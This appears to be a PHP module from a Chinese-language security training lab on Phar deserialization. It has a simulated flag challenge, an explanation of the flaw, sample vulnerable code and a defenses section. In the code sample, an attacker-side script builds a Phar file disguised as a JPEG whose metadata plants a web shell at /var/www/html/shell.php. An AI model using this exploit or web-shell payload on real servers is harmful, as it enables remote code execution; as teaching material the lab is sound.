<?php
$module_name = 'Phar反序列化';
$module_icon = '📦';
$module_desc = '利用phar://协议触发Phar文件元数据的自动反序列化，突破上传限制。';

$flag = getenv('FLAG') ?: 'flag{deserialization_success}';

$challenge_result = '';
if (isset($_GET['file'])) {
    $filepath = $_GET['file'];
    $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>📂 输入路径</h6></div><div class="card-body"><p><strong>路径：</strong>' . htmlspecialchars($filepath) . '</p><p><strong>协议：</strong>' . (preg_match('/^(\w+):\/\//', $filepath, $m) ? htmlspecialchars($m[1]) : '无') . '</p></div></div>';

    if (preg_match('/^phar:\/\//i', $filepath)) {
        $challenge_result .= '<div class="alert alert-info"><h6>✅ 检测到Phar协议！</h6><p>在实际环境中，这会触发Phar元数据的反序列化。</p></div>';
        $challenge_result .= '<div class="card mb-3"><div class="card-header"><h6>🔄 Phar反序列化过程</h6></div><div class="card-body"><pre class="bg-dark text-light p-3 rounded">1. 文件系统函数检测到 phar:// 协议
2. Phar解析器读取Phar文件
3. 自动调用 unserialize() 解析元数据
4. 触发对象的 __destruct() 或 __wakeup() 方法
5. 执行恶意代码</pre></div></div>';
        $challenge_result .= '<div class="alert alert-success"><strong>🚩 Flag：</strong>' . htmlspecialchars($flag) . '</div>';
    } else {
        $challenge_result .= '<div class="alert alert-danger"><h6>❌ 未检测到Phar协议</h6><p>请使用 phar:// 协议前缀</p></div>';
    }
}

$content = <<<'EOT'
<div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 漏洞原理</h5></div>
            <div class="card-body">
                <div class="alert alert-info">
                    <strong>什么是Phar反序列化？</strong><br>
                    <code>phar://</code> 是PHP的归档格式。当使用文件系统函数（如 <code>file_exists()</code>、<code>file_get_contents()</code> 等）处理 <code>phar://</code> 协议的URL时，会<strong>自动触发Phar文件中元数据的反序列化</strong>。
                </div>
                <div class="alert alert-warning">
                    <strong>漏洞产生原因：</strong>
                    <ul>
                        <li>Phar文件的元数据（metadata）使用 <code>serialize()</code> 存储</li>
                        <li>当文件系统函数处理 <code>phar://</code> 协议时，会调用 <code>unserialize()</code> 解析元数据</li>
                        <li>如果存在可利用的 <code>__destruct()</code> 或 <code>__wakeup()</code> 方法，就能触发任意代码执行</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💻 漏洞代码</h5></div>
            <div class="card-body">
                <pre class="bg-dark text-light p-3 rounded"><code>class FileHandler {
    public $filename;
    public $content;

    public function __destruct() {
        if ($this->content) {
            file_put_contents($this->filename, $this->content);
        }
    }
}

// 限制只能上传图片，但用file_exists检查时可触发phar反序列化
function checkFile($filepath) {
    $ext = strtolower(pathinfo($filepath, PATHINFO_EXTENSION));
    $allowed = ['jpg', 'jpeg', 'png', 'gif'];
    if (!in_array($ext, $allowed)) {
        die("只允许上传图片文件！");
    }
    // file_exists会触发phar://协议的反序列化
    if (file_exists($filepath)) {
        echo "文件存在";
    }
}

// === Phar文件生成代码（攻击者本地执行）===
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$obj = new FileHandler();
$obj->filename = '/var/www/html/shell.php';
$obj->content = '<?php system($_GET["cmd"]);?>';
$phar->setMetadata($obj);  // 元数据会被反序列化

$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
rename('evil.phar', 'evil.jpg');  // 伪装为图片</code></pre>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">🎯 尝试挑战</h5></div>
            <div class="card-body">
                <form method="GET">
                    <div class="mb-3">
                        <label class="form-label">文件路径（模拟phar://协议）：</label>
                        <input type="text" name="file" class="form-control" placeholder="输入文件路径，如：phar://test.phar/test.txt">
                    </div>
                    <button type="submit" class="btn btn-primary">检查文件</button>
                </form>
                <?php echo $challenge_result; ?>
            </div>
        </div>

        <div class="card mb-3">
            <div class="card-header"><h5 class="mb-0">💡 解题提示</h5></div>
            <div class="card-body">
                <ul>
                    <li><strong>Phar文件创建：</strong>使用 <code>Phar</code> 类创建Phar文件，设置元数据为恶意对象</li>
                    <li><strong>绕过扩展名检查：</strong>Phar文件可以使用任意扩展名（如 <code>.jpg</code>、<code>.png</code>）</li>
                    <li><strong>触发反序列化：</strong>使用 <code>phar://</code> 协议访问Phar文件</li>
                </ul>
                <pre class="bg-dark text-light p-3 rounded"><code><?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$obj = new FileHandler();
$obj->filename = '/tmp/hacked.txt';
$obj->content = 'Hacked!';
$phar->setMetadata($obj);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
rename('test.phar', 'test.jpg');
?></code></pre>
            </div>
        </div>

        <div class="card">
            <div class="card-header"><h5 class="mb-0">🛡️ 防御措施</h5></div>
            <div class="card-body">
                <ul>
                    <li>使用 <code>phar.readonly = On</code> 防止Phar文件被修改</li>
                    <li>过滤 <code>phar://</code> 协议前缀</li>
                    <li>使用白名单验证文件路径</li>
                </ul>
            </div>
        </div>
EOT;

include '../template/module_template.php';
